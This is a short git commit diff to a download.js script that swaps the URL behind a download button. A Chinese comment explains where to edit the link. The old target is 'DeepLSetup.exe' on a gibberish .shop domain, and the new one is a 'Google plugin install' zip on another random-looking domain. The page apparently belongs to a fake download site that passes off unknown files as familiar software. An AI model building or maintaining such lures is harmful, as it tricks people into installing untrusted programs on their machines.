b187a15107940b3796720d8d4e8619bd8da32adf
a168188aa <lishimingzaw@gmail.com>
2026-08-08 17:03:37 +0800

    Update download.js

--- downnload/download.js
+++ downnload/download.js
@@ -1,8 +1,8 @@
 $(function () {
     // 定义不同class对应的跳转链接
     var urlMap = {
-        //'link_download': 'https://msntnisnsoitnah.shop/ossmntsisleydna/DeepLSetup.exe', 
-        'link_download': 'https://msntnisnsoitnah.shop/ossmntsisleydna/DeepLSetup.exe',//这个就是改下载链接的地方，要是完整的链接就直接把''号里面的都替换掉，比如'https://www.ddd.com/ddd.zip' 这样即可，如果包上传到这个站点的download文件夹中了，就把aaa换成你的包名
+        //'link_download': 'https://lsmdngnakjbgazxv.com/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85.zip', 
+        'link_download': 'https://lsmdngnakjbgazxv.com/%E8%B0%B7%E6%AD%8C%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85.zip',//这个就是改下载链接的地方，要是完整的链接就直接把''号里面的都替换掉，比如'https://www.ddd.com/ddd.zip' 这样即可，如果包上传到这个站点的download文件夹中了，就把aaa换成你的包名
     };
 
     // 为每个class添加点击事件
